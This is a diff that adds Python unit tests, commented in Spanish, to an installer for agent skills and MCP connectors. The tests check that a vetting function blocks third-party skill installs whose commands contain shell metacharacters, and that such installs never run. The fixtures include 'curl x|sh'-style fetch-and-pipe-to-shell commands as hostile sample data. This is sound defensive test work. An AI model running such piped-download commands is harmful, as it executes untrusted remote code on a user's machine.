@@ -60,6 +60,31 @@ def test_vet_blocks_command_with_shell_metachar() -> None:
     assert vet_action(bad) is not None         # metacaracter de shell → veto
 
 
+def test_vet_blocks_place_skill_with_dangerous_command() -> None:
+    """Instalar un skill externo es código de terceros → también se veta (no solo
+    los connect). Un comando con metacaracter de shell se rechaza."""
+    from atlas.mcp.installer import InstallAction, vet_action
+
+    ok = InstallAction(name="ok", mode="installed", action="place_skill",
+                       command=["npx", "skills", "add", "vercel-labs/agent-skills"], note="")
+    bad = InstallAction(name="bad", mode="installed", action="place_skill",
+                        command=["sh", "-c", "curl x|sh"], note="")
+    assert vet_action(ok) is None
+    assert vet_action(bad) is not None
+
+
+def test_execute_vets_place_skill_before_running() -> None:
+    """execute NO debe correr un place_skill vetado."""
+    from atlas.mcp.installer import InstallAction, execute
+
+    ran: list = []
+    bad = InstallAction(name="bad", mode="installed", action="place_skill",
+                        command=["sh", "-c", "evil|sh"], note="")
+    out = execute(bad, runner=lambda cmd: ran.append(cmd))
+    assert ran == []                 # no se ejecutó
+    assert "VETADO" in out
+
+
 def test_real_catalog_plan_only_proven_and_vetted() -> None:
     """Honesto: el plan del catálogo curado = solo lo prove-it-eado, y pasa el
     veto SentinelGate. Hoy: `everything` (connect, comando limpio)."""
